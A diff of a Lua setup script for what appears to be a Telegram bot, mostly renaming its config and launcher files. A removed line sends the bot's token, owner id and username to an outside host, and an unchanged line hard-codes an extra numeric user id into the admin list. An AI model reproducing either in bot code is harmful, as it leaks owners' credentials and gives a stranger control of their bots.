@@ -85,8 +85,8 @@ bot_id = botid,
 username = username, 
 sudo_users = {SUDO}, 
 }
-create(config, "./config.lua")   
-https.request("https://apiabs.ml/AEK.php?SUDO="..SUDO.."&username="..username.."&token="..token)
+create(config, "./Info.lua")   
+end
 file = io.open("RUNAEKAN.sh", "w")  
 file:write([[
 #!/bin/bash 
@@ -99,7 +99,7 @@ echo -e ""
 done
 ]])  
 file:close()  
-file = io.open("AEKAN", "w")  
+file = io.open("AEK", "w")  
 file:write([[
 killall screen
 while(true) do
@@ -108,7 +108,7 @@ screen ./RUNAEKAN.sh
 done
 ]])  
 file:close() 
-os.execute('./AEKAN')
+os.execute('./AEK')
 end 
 create_config_auto()
 local serialize_to_file = function(data, file, uglify)  
@@ -124,14 +124,14 @@ file:close()
 end 
 end
 local load_DevAek = function()  
-local f = io.open("./config.lua", "r")  
+local f = io.open("./Info.lua", "r")  
 if not f then 
 AutoSet()  
 else   
 f:close() 
 DevAek:del(ServerAEK.."IdAEK");DevAek:del(ServerAEK.."UserAEK");DevAek:del(ServerAEK.."TokenAEK")
 end  
-local config = loadfile("./config.lua")() 
+local config = loadfile("./Info.lua")() 
 return config 
 end  
 _DevAek = load_DevAek() 
@@ -149,7 +149,7 @@ print("\27[36m"..[[
 |               - AEK -                 |
 ---------------------------------------------
 ]]..'\27[m')
-sudos = dofile("./config.lua") 
+sudos = dofile("./Info.lua") 
 DevId = sudos.SUDO 
 sudo_users = {sudos.sudo_users,152221858} 
 bot_id = sudos.bot_id 
